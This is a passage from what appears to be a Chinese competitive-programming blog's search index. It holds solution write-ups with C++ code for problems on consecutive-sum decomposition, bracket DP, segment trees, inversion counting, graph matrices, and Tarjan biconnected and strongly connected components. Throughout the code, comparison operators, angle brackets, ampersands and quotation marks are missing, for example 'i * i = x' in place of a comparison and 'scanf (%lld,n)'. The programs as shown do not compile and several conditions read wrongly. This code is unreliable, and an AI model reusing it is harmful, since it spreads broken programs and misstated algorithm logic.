操作，经过计算发现此时代码无法通过最后一个子任务。最简单的方式就是在最后一次二分时特判以减少一次 ? l S p 操作。最后一次二分操作是在 $[1,2]$ 或 $[1,3]$ 的范围时，但因为题中 $n$ 的大小已经确定，所以计算得出只需要特判后者的情况即可。我们仍然用第一个操作中余数互不相同以求出区间中不同的数的性质，发现 $5 \\bmod i (1 \\le i \\le 3)$，恰好余数互不相同，故最少使用两次 ! x y 操作代替原来的 ? l S p 操作求出。 程序的完整代码较长，放入剪贴板中：戳我。","categories":["Solution"]},{"title":"题解：P6267 [SHOI2002]N的连续数拆分","path":"/2021/08/20/P6267/","content":"[SHOI2002]N的连续数拆分【数据加强版】 来一个和其它题解稍稍有些不一样的做法。 首先还是列出等式，设最小的正整数为 $l$，最大的正整数为 $r$，则由求和公式可列出式子： \\begin{cases} 0 < l \\le r \\le n\\\\ l,r \\in \\mathbb{N^*}\\\\ \\dfrac{1}{2}(l + r) (r - l + 1) = n\\\\ \\end{cases}化简一下第二个式子便是 $(l + r) (r - l + 1) = 2n$，因此必须要有 $l + r \\mid 2n$ 且 $r - l + 1 \\mid 2n$。再设 $a = l + r,b = r - l + 1$，直接解得 \\begin{cases} r = \\dfrac{a + b - 1}{2}\\\\ l = a - r \\end{cases}显然当 $2 \\mid a + b - 1$ 时才有正整数解。因此我们枚举 $2n$ 的因数，然后判断是否符合条件，然后累加答案。由于因数两两配对，所以时间复杂度为 $O(\\sqrt{2n})$。核心代码如下： int work (ll x) int cnt = 0; x = 1; for (ll i = 2;i * i = x;++i)//记得为 long long if (x % i == 0) if ((i + x / i) 1) ++cnt; return cnt; 那么还有没有更优的解法呢？？ 我们观察 $a,b$ 的奇偶性，因为 $2 \\mid a + b - 1$ 才存在解，也就是 $a + b$ 一定为奇数。又因为只有在奇数与偶数相加时才得到奇数，所以 $a,b$ 必定为一奇一偶。所以可以将题目转化为求 $2n$ 的奇数因子，等同与求 $n$ 的奇数因子。 先将 $n$ 进行质因数分解 $n = \\prod_{i = 1}^{k} p_i^{c_i}$，然后根据算数基本定理，除去唯一的偶质数 $2$ 后求奇数因数个数即可。因为质数中除了 $2$ 均为奇数，所以先预处理出 $\\sqrt{n}$ 内的质数，然后再求因数时把所有 $2$ 除去即可。完整代码如下： //这个方法在多组数据中会更优#include iostream#include cstdio#include cmath#define ll long longusing namespace std;const int MAX = 3e7 + 5;int cnt,p[MAX 1];//p 记录质数，显然 sqrt (n) 的一半足够了ll n;bool flag[MAX];void pre (int x);int main () //先分解质因子，然后计算奇因子的个数 scanf (%lld,n); pre ((int)sqrt (n));//枚举到 sqrt(n) int ans = 1; for (int j = 1;j = cnt (ll)p[j] * p[j] = n;++j)//边界枚举 int k = 0; while (n % p[j] == 0) if (j != 1) ++k;//第一个质数为 2 n /= p[j]; ans *= (k + 1);//算数基本定理 if (n 2) ans *= 2;//注意剩余的那个质数也需要是奇数才行 printf (%d ,ans); return 0;void pre (int x)//线性筛质数 for (int i = 2;i = x;++i) if (!flag[i]) p[++cnt] = i; for (int j = 1;j = cnt;++j) if (i * p[j] x) break; flag[i * p[j]] = 1; if (i % p[j] == 0) break;","categories":["Solution"]},{"title":"题解：UVA1626 括号序列 Brackets sequence","path":"/2021/08/15/UVA1626/","content":"这是一道区间 $\\texttt{dp}$ 的典型题目。 设 $dp_{i,j}$ 表示串中第 $i$ 个到第 $j$ 个括号串最少需要括号才能完全匹配的个数。有两个显然的结论：一是 $dp_{i,i} = 1$，因为一个括号无法匹配，要且仅需要一个括号即能完全匹配；二是合并的时候是从小区间往大区间合并，因为只有计算完小区间的答案才能更新大区间。 对于一个 $i$ 至 $j$ 的区间（$i j$），可以由在此区间内的任意两个小区间合并得到答案，也就是 $dp_{i,j} = \\min (dp_{i,j},dp_{i,k} + dp_{k + 1,j}),i \\le k j$。当然，当 $i$ 与 $j$ 本身匹配时，需要先取个最值 $dp_{i,j} = \\min (dp_{i,j},dp_{i + 1,j - 1})$。 题目还需要输出方案，也就是要通过递归由答案倒退过程。f(i,j) 表示要还原的括号的范围。显然 $i = j$ 的时候直接匹配括号的另一半；当 $i$ 与 $j$ 匹配时，直接可以输出这两个括号，问题也就缩小为求 f(i + 1,j - 1)；如果不匹配，就模拟区间 $\\texttt{dp}$ 的过程，找到一个符合条件的 $k$,然后分别求解 f(i,k) 与 f(k + 1,j) 就行了。 对于数组初始化的方式，分为三种情况，列举如下： $i = j$，就是 $dp_{i,j} = 1$。 $i j$，显然此时不成串，为防止干扰，将其设置为 $0$。 $i j$，因为区间 $\\texttt{dp}$ 要取最小值，所以全部设置为 $\\infty$。 最后提醒一下各位对于题目多组数据的一个小提醒：不要忘记初始化！不要忘记组间的空格！不要在最后一组数据这多输出一个空格！可能输入有空串！ 完整代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 105;const int MOD = 1e9 + 7;inline int read ();string str;int n,t,dp[MAX][MAX];void print (int x,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) init (dp); getline (cin,str); getline (cin,str); int n = str.size (); if (!n)//注意有空串的情况，所以用 getline 输入 puts (); if (t) puts (); continue; for (int i = 0;i n;++i) for (int j = 0;j n;++j) if (i == j) dp[i][j] = 1;//显然只需要匹配一个 else if (i j) dp[i][j] = 0;//不成串 else dp[i][j] = INF;//因为要取 min，所以设置为正无穷 for (int j = 0;j n;++j)//小区间 - 大区间，注意枚举顺序 for (int i = j - 1;i = 0;--i) if (str[i] == ( str[j] == ) || str[i] == [ str[j] == ]) dp[i][j] = min (dp[i][j],dp[i + 1][j - 1]); //匹配情况 for (int k = i;k j;++k) dp[i][j] = min (dp[i][k] + dp[k + 1][j],dp[i][j]); //printf (%d ,dp[1][n]); print (0,n - 1); puts (); if (t) puts ();//格式注意一下 return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void print (int x,int y)//依据 dp 方式回溯打印 if (x y) return ; if (x == y) if (str[x] == ( || str[x] == )) printf (()); else printf ([]); return ; if (((str[x] == ( str[y] == )) || (str[x] == [ str[y] == ])) dp[x][y] == dp[x + 1][y - 1]) printf (%c,str[x]); print (x + 1,y - 1); printf (%c,str[y]); return ; for (int k = x;k y;++k) if (dp[x][y] == dp[x][k] + dp[k + 1][y]) print (x,k);print (k + 1,y); return ;//找到一组就可以了","categories":["Solution"]},{"title":"题解：CF527C Glass Carving","path":"/2021/08/06/CF527C/","content":"对于每一次切割后，求出最大的碎片面积，也就是求出完整的玻璃的最大长度与最大宽度之积。 由题意可知，一条长度为 $k$ 的边，最多可以被切 $k - 1$ 次，因为在此之后均为长度为 $1$ 的边无法在切割。于是我们就可以用 $0$ 或 $1$ 来表示该边的某个点是否被切割，总共表示 $k - 1$ 个点。初始的时候每个点均为 $0$，表示所有的点均未被切割，每输入一次后将相应的切割点标记为 $1$。于是乎，不难将问题转化成求每次切割后每条边的最长 $0$ 的个数。 考虑用线段树来维护，一棵线段树共有以下参数：len、l、r 与 mx，分别表示区间的长度、从左端点最长 $0$ 的个数、从右端点最长 $0$ 的个数以及该区间最长 $0$ 的个数。 下面我将分别讲述 build 、 modify 与 pushup 函数。 在 build 函数中，因初始时均为 $0$，所以每段区间的 l、r 与 mx 的值均为 len，即 $r - l + 1$，有以下代码： void build (T tree[],int cur,int l,int r) tree[cur].l = tree[cur].r = tree[cur].mx = tree[cur].len = r - l + 1; if (l == r) return ; int mid = (l + r) 1; build (tree,cur 1,l,mid); build (tree,cur 1 | 1,mid + 1,r); pushup (tree,cur);//这个在接下去讲 在 modify 函数中，由题可知是一个单点的修改，因此我们只需要在 $l = r$ 之时把该点的值改为 $1$，表示已被切割就可以了。同时，该区间的 l、r 与 mx 因数值的变化均会变为 $0$。代码如下： void modify (T tree[],int cur,int l,int r,int x) if (l == r x == l) tree[cur].l = tree[cur].r = tree[cur].mx = 0;//已被切割，此点变为 1，故该点的 0 个数均更新为 0 return ; int mid = (l + r) 1; if (x = mid) modify (tree,cur 1,l,mid,x); else modify (tree,cur 1 | 1,mid + 1,r,x); pushup (tree,cur); 最后来讲 pushup 函数，每个区间在更新后除长度不会改变外其余均有变动。首先是 l 的值，分两种情况，若从左端点最长 $0$ 的个数与区间长度相等，则说明正一段区间均为 $0$，因此可以更新至右区间的左端 $0$ 所能达到的最远之处，相加即可；否则就是左端点的 l 的值。r 的值同理分两种情况，不再赘述。同时，需要更新区间 mx，易得有三种情况，分别为左端点开始最长的 $0$ 的个数，右端点开始最长的 $0$ 的个数以及序列中间最长的 $0$ 的个数，三者取最值就能更新答案了。代码如下： void pushup (T tree[],int cur) if (tree[cur 1].l == tree[cur 1].len) tree[cur].l = tree[cur 1].len + tree[cur 1 | 1].l; else tree[cur].l = tree[cur 1].l; if (tree[cur 1 | 1].r == tree[cur 1 | 1].len) tree[cur].r = tree[cur 1 | 1].len + tree[cur 1].r; else tree[cur].r = tree[cur 1 | 1].r; tree[cur].mx = max (tree[cur 1].mx,max (tree[cur 1 | 1].mx,tree[cur 1].r + tree[cur 1 | 1].l));//三段取最值 最后给出主函数，查询即为下标为 $1$ 的线段树的数组的 mx 值，但返回的答案记得 $+1$，画一下图就能悟了哦！ int main () m = read ();n = read ();q = read (); build (tree_l,1,1,n - 1);build (tree_h,1,1,m - 1); while (q--) char x;int num; scanf (%c,x);num = read (); if (x == H) modify (tree_l,1,1,n - 1,n - num);//距离底部 else modify (tree_h,1,1,m - 1,num);//距离左端 ll da = tree_h[1].mx + 1,db = tree_l[1].mx + 1;//别忘了 printf (%lld ,da * db); return 0;","categories":["Solution"]},{"title":"题解：UVA11858 Frosh Week","path":"/2021/07/25/UVA11858/","content":"题目就是求多组数据的逆序对。对于每组数据，$n$ 的范围较大，为 $1 \\le n \\le 10^6$。而求逆序对，就需要树状数组加上离散化。 离散化就是把无限空间中有限的个体映射到有限的空间中去，这样即使 $a_i$ 较大，也不会导致 $\\texttt{MLE}$。 首先把用 $a_i$ 记录输入的数，$b_i$ 记录编号 $i$，然后根据 $a_i$ 的大小将 $b$ 数据进行排序。这样，较大的数就由编号进行替代了。 for(register ll i = 1;i = n;++i) scanf(%lld,a[i]),b[i] = i;sort(b + 1,b + 1 + n,cmp);//离散化 for(register ll i = 1;i = n;++i) a[b[i]] = i;bool cmp(ll x,ll y) if(a[x] == a[y]) return x y; return a[x] a[y]; 树状数组具体的写法见 【模板】树状数组 1，在此介绍如何统计逆序对的个数。 对于编号为 $i$ 的数，若是要构成逆序对，则需要找到编号为 $1$ 至 $i - 1$ 且比 $a_i$ 大的数才行。每次加向树状数组能新加数之前先查询比将要加入的数大的个数，于是遍历 $1$ 至 $n$ 后，个数相加的和就是逆序对的个数了。因此有如下代码： ans += i - 1 - find(a[i]);//树状数组的元素个数减去树状数组中小于该数的数即为答案add(a[i]);//将新数加入树状数组中 完整代码#include iostream#include algorithm#include cstring#include cstdio#define ll long long#define init(x) memset (x,0,sizeof (x))using namespace std;const int MAX = 1e6 + 50;ll a[MAX],b[MAX],c[MAX],n,ans;int t;bool cmp(ll x,ll y);ll lowbit(ll x);ll find(ll x);void add(ll x);int main() while (scanf(%d,n) != EOF) init (a);init (b);init (c);ans = 0; for(register ll i = 1;i = n;++i) scanf(%lld,a[i]),b[i] = i; sort(b + 1,b + 1 + n,cmp);//离散化 for(register ll i = 1;i = n;++i) a[b[i]] = i; for(register ll i = 1;i = n;++i) ans += i - 1 - find(a[i]);//树状数组的元素个数减去树状数组中小于该数的数即为答案 add(a[i]);//将新数加入树状数组中 printf(%lld ,ans); return 0;bool cmp(ll x,ll y) if(a[x] == a[y]) return x y; return a[x] a[y];ll lowbit(ll x) return x (-x);ll find(ll x) ll num = 0; for(ll i = x;i = 1;i -= lowbit(i)) num += c[i]; return num;void add(ll x) for(ll i = x;i = n;i += lowbit(i)) ++c[i];","categories":["Solution"]},{"title":"题解：B3600 [图论与代数结构 101] 图的代数表示","path":"/2021/07/08/B3600/","content":"Update on 2021.07.10：修改了题解中关联矩阵【无权图】 部分的错误。 这道题目需要极大的耐心以及细心程度，但是思维难度不大，按照题意模拟即可。【注：本题解所有内容涉及的图片见文章底部。图片的圈中的黑色数字为结点编号，边上的紫色数字为边编号，边上的黑色数字为边权。】 前置设输入的一条边为 $(u,v)$，$dis[u][v]$ 为非零时即有连边。 判断重边：if (dis[u][v]) chong = 1;//dis非零，说明出现重边；判断自环：if (u == v) itself = 1;//说明是自环。 邻接矩阵【无权图】邻接矩阵表示结点之间的邻接关系。该矩阵是由 $n \\times n$ 的布尔数组组成，若 $G[i,j] = 1$，则表示一条 $i$ 至 $j$ 的边；若 $G[i,j] = 0$，则表示没有一条 $i$ 至 $j$ 的边。因此不难发现，在无向图的邻接矩阵中，有 $G[i,j] = G[j,i]$。 特点：可以表示自环，但无法表示重边。 如图一，这是一张结点数为 $5$ 的无向无权图，将其表示成邻接矩阵为： \\left [ \\begin{matrix} 0&1&1&0&0\\\\ 1&0&1&0&1\\\\ 1&1&0&1&0\\\\ 0&0&1&0&1\\\\ 0&1&0&1&0\\\\ \\end{matrix} \\right ]因此可以得到代码： if (!ty_2) int u = read (),v = read (); if (!ty_1) dis[u][v] = dis[v][u] = 1;//无向图 else dis[u][v] = 1;//有向图for (int i = 1;i = n;++i)//矩阵的打印 for (int j = 1;j = n;++j) printf (%d ,dis[i][j]); puts (); 权矩阵【赋权图】与邻接矩阵相似，表示结点之间的邻接关系。该矩阵是由 $n \\times n$ 的数组组成，若 $G[i,j] = d$，则表示一条 $i$ 至 $j$ 的权值为 $d$ 的边；若 $G[i,j] = 0$，则表示没有一条 $i$ 至 $j$ 的边。 特点：可以表示自环，但无法表示重边。 如图二，这是一张结点数为 $5$ 的有向赋权图，将其表示成权矩阵为： \\left [ \\begin{matrix} 0&2&0&0&0\\\\ 0&0&3&0&0\\\\ 1&0&0&0&0\\\\ 0&0&5&0&1\\\\ 0&3&0&0&0\\\\ \\end{matrix} \\right ]代码与邻接矩阵大题相似，无非把 dis[u][v] = 1 改为 dis[u][v] = d，故不再赘述。 关联矩阵【无权图】关联矩阵表示结点与边之间的关联关系。该矩阵是由 $n \\times m$ 的数组组成，设矩阵为 $G$，则有 $\\forall x \\in G,x \\in \\{1,0,-1\\}$。对于无向图，若 $G[i,j] = 1$，则点 $i$ 是边 $j$ 的端点；对于有向图来说，若 $G[i,j] = 1$，则点 $i$ 是边 $j$ 的始点，若 $G[i,j] = -1$，则点 $i$ 是边 $j$ 的终点。若 $G[i.j] = 0$，则点 $i$ 与边 $j$ 不相连。 特点：可以表示重边，但无法表示自环。 如图一，这是一张结点数为 $5$ 的无向无权图，将其表示成关联矩阵为： \\left [ \\begin{matrix} 1&1&0&0&0&0\\\\ 1&0&1&1&0&0\\\\ 0&1&1&0&1&0\\\\ 0&0&0&0&1&1\\\\ 0&0&0&1&0&1\\\\ \\end{matrix} \\right ]代码如下： int u = read (),v = read ();if (!ty_1) con[u][i] = con[v][i] = 1;//无向图else con[u][i] = 1,con[v][i] = -1;//有向图一个为始点，一个为终点for (int i = 1;i = n;++i)//关联矩阵的打印 for (int j = 1;j = m;++j) printf (%d ,con[i][j]); puts (); 邻接表邻接表相当于一张表示结点结构的单链表。对于一张图，结点 $u$ 的表的元素 $v$ 满足 $dis[u][v] 0$。若为赋权图，则还要记录 $u$ 到 $v$ 的边权。 特点：可以表示重边与自环。 如图二，这是一张结点数为 $5$ 的有向赋权图，将其表示成邻接表为： 2 23 31 13 5 5 12 3 因为每个结点的表的元素个数不确定，因此可以用动态数组 vector int name[MAX],quan[MAX]。代码很简单： if (!ty_2) int u = read (),v = read (); if (!ty_1) name[u].push_back (v),name[v].push_back (u);//无向图两个点均加入 else name[u].push_back (v);//有向图只加单向的else int u = read (),v = read (),d = read (); if (!ty_1) name[u].push_back (v),name[v].push_back (u),quan[u].push_back (d),quan[v].push_back (d); //此时为赋权图，还需要记录权值 else name[u].push_back (v),quan[u].push_back (d);//有向图只加单向的//注意，如果某个节点的表的元素个数为 0，也要单独输出一个空行，不能忽略（之前样例有误）if (!ty_2)//有无赋权的两种情况 for (int i = 1;i = n;++i) for (int j = 0;j name[i].size ();++j) printf (%d ,name[i][j]); puts (); else for (int i = 1;i = n;++i) for (int j = 0;j name[i].size ();++j) printf (%d %d ,name[i][j],quan[i][j]); puts (); 正向表/逆向表一种压缩储存的方式，可以节省空间。向量 $A$ 表示结点 $u$ 的直接后继结点在 $B$ 中的首地址(逆向表则为前驱结点)，向量 $B$ 储存结点编号，向量 $C$ 储存权值。 如图二，这是一张结点数为 $5$ 的有向赋权图，将其表示成正向表/逆向表为： //正向表1 2 3 4 6 72 3 1 3 5 22 3 1 5 1 3//逆向表1 2 4 6 6 73 1 5 2 4 41 2 3 3 5 1 设结点 $u$ 的邻接表的元素个数为 $x$。则正向表的三个向量计算如下：对于向量 $A$，首先规定 $A[1] = 1$。对于结点 $1$ 至 $n$，$A[i + 1] = A[i] + x_i$。向量 $B,C$ 便是遍历邻接表中所有元素并记录编号(以及权值)。 代码如下： for (int i = 1;i = n;++i)//正向表 zheng.push_back (zheng[zheng.size () - 1] + name[i].size ());//向量 A 的计算 for (int j = 0;j name[i].size ();++j) zn.push_back (name[i][j]);//向量 B 记录结点编号 if (ty_2) zq.push_back (quan[i][j]);//向量 C 记录权值 对于逆向表来说，正好与正向表相反。在为有向图的前提下，进行反向连边，如原来为 $u \\to v$，变为 $v \\to u$。然后根据反向边，进行与正向表相同的操作即可。 尾声这样就完整地解决了题目的所有表示方法。做该题目时，一定要严格按照题意输入输出，利用好 if 语句判断每一张表在不同的数据中是否要输出。 最后，再次感谢您能看到结尾！ 附文中图如下： 完整代码戳此链接：代码。","categories":["Solution"]},{"title":"题解：B3610 [图论与代数结构 801] 无向图的块","path":"/2021/07/05/B3610/","content":"本题求的是点双连通分量。还是先讲一下有关的概念： 割点：在一个无向连通图中，如果删除某个点和这个点关联的所有边，使剩下的图不再连通的点。 点双连通图：在一个无向连通图中，对于任意一个点，若删除这个点和这个点关联的所有边后，剩下的图仍能连通的图。 点双连通分量： 在无向图 $G$ 中，如果一个点双连通子图 $G’$ 不是任何一个点双连通子图的真子集，则图 $G’$ 为图 $G$ 的极大点双连通子图，即点双连通分量。 接下去讲解法（以下用 dfn 数组记录访问每个点的时间，用一个 low(u) 来表示 $u$ 以及其后代最多经过一条反向边能回到的最早的时间戳）。 在一个连通图中，若点 $u$ 为树根，对于点 $u$ ，若当且仅当它有两个或者更多的子结点时，则它为割点；若点 $u$ 为非根的结点，则有定理—在无向连通图 $G$ 的 DFS 树中，$u$ 是个割点当且仅当 $u$ 存在一个子结点 $v$，使得 $v$ 及其所有后代都没有反向边连回 $u$ 的祖先（注意：不包括 $u$）。 则当一条边 $(u,v)$ 有 low[v] = dfn[u] 时 $u$ 为割点。将 low[u] 更新时，分为树边 low[u] = min (low[u],dfn[u]) 和反向边 low[u] = min (low[u],dfn[v]) 即可。 记录点双连通分量也很简单，首先用栈压入保存元素，等找到割点后再弹出并用 set 记录就行。为什么要用 set？原因很简单，就是它能不重复且有序的记录元素。 最后需要注意一下输出的大小顺序，直接对 set 做一次 sort 即可输出。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include set#include stack#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 3e5 + 5;const int MOD = 1e9 + 7;int n,m,cnt,bcc_cnt,times;int dfn[MAX],low[MAX],bcc_in[MAX];int to[MAX 1],head[MAX 1],nxt[MAX 1];bool vis[MAX];set int bcc[MAX];stack pair int,int s;//用 pair 记录一条边的 u 与 vinline int read ();void _add (int u,int v);void dfs (int u,int fa);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = m;++i) int u = read (),v = read (); _add (u,v);_add (v,u);//双向边，需要注意数组的大小 for (int i = 1;i = n;++i) if (!dfn[i]) dfs (i,-1);//图不一定联通，需全部遍历 printf (%d ,bcc_cnt); sort (bcc + 1,bcc + 1 + bcc_cnt); for (int i = 1;i = bcc_cnt;++i) for (set int::iterator it = bcc[i].begin ();it != bcc[i].end ();++it) printf (%d ,*(it));//set 的输出需要注意 puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void dfs (int u,int fa) dfn[u] = low[u] = ++times; int child = 0; for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) s.push (u,v); ++child; dfs (v,u); low[u] = min (low[u],low[v]); if (low[v] = dfn[u])//一个割点出现，记录一个点双连通分量 ++bcc_cnt; while (1) int x = s.top ().first,y = s.top ().second; s.pop (); bcc_in[x] = bcc_in[y] = bcc_cnt; bcc[bcc_cnt].insert (x); bcc[bcc_cnt].insert (y); if (x == u y == v) break; else if (dfn[v] dfn[u] v != fa)//特殊情况 s.push(u,v); low[u] = min (low[u],dfn[v]);","categories":["Solution"]},{"title":"题解：B3609 [图论与代数结构 701] 强连通分量","path":"/2021/07/03/B3609/","content":"模板题，强连通分量在本文使用 tarjan 算法进行求解。 首先是概念： 如果在有向图 $G$ 中的任意两个点都相互可达，则图 $G$ 是一个强连通图。 在有向图 $G$ 的的所有子图 $G’$中，如果 $G’$ 是一个强连通图，则图 $G’$ 为图 $G$ 的强连通子图。如果一个强连通子图 $G’$ 不是任何一个强连通子图的真子集，则图 $G’$ 为图 $G$ 的极大强连通子图，也称为 强连通分量。 然后是解决方法： 注： 以下用 dfn 数组记录访问每个点的时间，用一个 low(u) 来表示 $u$ 以及其后代最多经过一条反向边能回到的最早的时间戳。 若强连通分量中第一个被发现的点是 $u$，那么集合中的点必然满足任意两点相互可达，因此最关键的就是找出每个强连通分量中的第一个点。若结点 $u$ 的子结点出发，能到达某祖先 $w$，则 $w$ 为第一个点。不难发现，若有 low[u] = dfn[u]，则有 $w = u$。 用 stack 来压入元素记录，当再次找到一个强连通分量的第一个点 $u$ 时，则弹出元素直至 $u$。因 dfs 每次只能找到若干个强连通分量，所以需要不断弹出然后用 set 记录每一个强连通分量的元素后并删除【用一个数组记录是否已经被安放至某个强连通分量中即可】，直到找到所有强连通分量。 题目中说明需要按字典序输出，因此遍历 $1-n$，用布尔数组记录该点所在强连通分量是否已经输出，这样就能完美解决了！ 代码如下： #include iostream#include cstdio#include cstring#include set#include stackusing namespace std;const int MAX = 1e5 + 5inline int read ();int n,m,cnt,scc_cnt;int to[MAX],nxt[MAX],head[MAX];int dfn[MAX],scc[MAX],low[MAX];bool vis[MAX];stack int s;set int scc_in[MAX];void _add (int u,int v);void dfs (int u);int main () n = read ();m = read (); for (int i = 1;i = m;++i) int u = read (),v = read (); _add (u,v);//有向图注意一下 for (int i = 1;i = n;++i) if (!dfn[i]) dfs (i);//遍历 printf (%d ,scc_cnt);//个数输出 for (int i = 1;i = n;++i) int p = scc[i];//对应的强连通分量 if (vis[p]) continue;//已经输出过 vis[p] = 1; for (set int :: iterator it = scc_in[p].begin ();it != scc_in[p].end ();++it) printf (%d ,*(it));//set 的输出与指针有关 puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void _add (int u,int v) to[++cnt] = v; nxt[cnt] = head[u]; head[u] = cnt;void dfs (int u) dfn[u] = low[u] = ++cnt;//时间戳 s.push (u);//元素压入 for (int i = head[u];i;i = nxt[i]) int v = to[i]; if (!dfn[v]) dfs (v); low[u] = min (low[u],low[v]); else if (!scc[v]) low[u] = min (low[u],dfn[v]);//已经进入某个强连通分量的话就删除 if (low[u] == dfn[u])//第一个点 ++scc_cnt;//个数加一 while (1)//弹出 int x = s.top (); s.pop (); scc[x] = scc_cnt; scc_in[scc_cnt].insert (x);//记录 if (x == u) break;","categories":["Solution"]},{"title":"题解：P7621 [AHOI2021初中组] 超市购物","path":"/2021/06/20/P7621/","content":"简单题，大致的题意就是求 $(\\sum_{i = 1}^n a_i \\times b_i) \\times 0.85$，然后保留一位小数的值。需要注意的是，这里的保留一位小数是直接舍去后面的数字，而不是四舍五入求值！ 处理保留一位小数的两种方法： 分类讨论，如果小数部分 $0.5$，就整体减去 $0.5$，否则不变，然后直接用 %0.1lf 输出。 直接操作 tot = ((int)(tot * 0.85 * 10)) / 10.0。 另外就直接相加就完事了。。。代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7; int n,sum;double price,tot;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%d,n); while (n--) scanf (%lf%d,price,sum); tot += price * sum; tot = ((int)(tot * 0.85 * 10)) / 10.0; printf (%0.1lf ,tot); return 0;","categories":["Solution"]},{"title":"题解：CF1535A Fair Playoff","path":"/2021/06/05/CF1535A/","content":"对于每组的数据，如果是公平的，那么两个能力值最高的人一定被分在了两组中。这个结论是显然的，因为如果被分在一组，那么一定会有一个人输，也就是不公平的。 有了这个结论，我们只需要判断能力最高的两人是否被分在同一组即可。对于一个数据类型 pairint,int，第一关键字为能力值，第二关键字为编号。首先通过 sort 函数用第一关键字进行排序，然后找到最后两项，若为第 $1,2$ 个人或第 $3,4$ 个人，也就是编号之和为 $3$ 或 $7$，则输出 NO；否则就是 YES。 这道题很简单，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n;pair int,int a[5];bool cmp (pair int,int x,pair int,int y);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) for (int j = 1;j = 4;++j) a[j].first = read (),a[j].second = j; sort (a + 1,a + 1 + 4,cmp); if (a[3].second + a[4].second == 7 || a[3].second + a[4].second == 3) printf (NO ); else printf (YES ); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;bool cmp (pair int,int x,pair int,int y) return x.first y.first;","categories":["Solution"]},{"title":"题解：CF914D Bash and a Tough Math Puzzle","path":"/2021/05/15/CF914D/","content":"这是一道几乎为模板的线段树裸题。题目要求的是单点更新，区间查询。 因为题目求的为 $\\gcd$，所以线段树合并的时候肯定要写成 tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1])，至于如何写 gcd (int x,int y) 函数，在此就不赘述。 首先讲区间查询。至多修改一个数，若能使其满足题意则输出 YES，否则为 NO。即修改的数为 $0$ 或 $1$ 时为 YES，其余情况均为 NO。和普通线段树的查询差不多，不过需要优化的有两个细节。一是当需要修改的数已经超过 $1$ 时，即可停止程序，因为答案此时一定为 NO；二是若整段的 $\\gcd$ 已经为 $x$ 的倍数，也就是说至少把一个数修改为 $x$ 后就会满足题意，故可以停止程序之间输出 NO。 其次是单点修改，十分简单，几乎和模板的修改没有区别。唯一要注意的是在修改后，线段树的合并方式为 tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1])，不要与 tree[cur] = tree[cur 1] + tree[cur 1 | 1] 混淆。 最后给一个完整代码： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,cnt,a[MAX],tree[MAX 2];int gcd (int x,int y);void build (int cur,int l,int r);void query (int cur,int l,int r,int x,int y,int v);void modify (int cur,int l,int r,int x,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read (); for (int i = 1;i = n;++i) a[i] = read (); build (1,1,n); m = read (); for (int i = 1;i = m;++i) int ty = read (); if (ty == 1) int l = read (),r = read (),x = read (); cnt = 0; query (1,1,n,l,r,x); if (cnt 1) printf (NO );//需要修改的大于 1 则无法完成 else printf (YES ); else int x = read (),v = read (); modify (1,1,n,x,v); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int gcd (int x,int y)//辗转相除 if (x y) swap (x,y);//确定大小 return (y == 0) ? x : gcd (y,x % y);void build (int cur,int l,int r) if (l == r) tree[cur] = a[l]; return ; int mid = (l + r) 1; build (cur 1,l,mid); build (cur 1 | 1,mid + 1,r); tree[cur] = gcd (tree[cur 1],tree[cur 1 | 1]);void query (int cur,int l,int r,int x,int y,int v) if (cnt 1 || tree[cur] % v == 0) return ;//优化程序的地方 if (l == r) ++cnt;//需要改动的数的个数 + 1 return ; int mid = (l + r) 1; if (x = mid) query (cur 1,l,mid,x,y,v); if (y mid) query (cur 1 | 1,mid + 1,r,x,y,v);void modify (int cur,int l,int r,int x,int v) if (l == r l == x) tree[cur] = v;//单点修改 return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 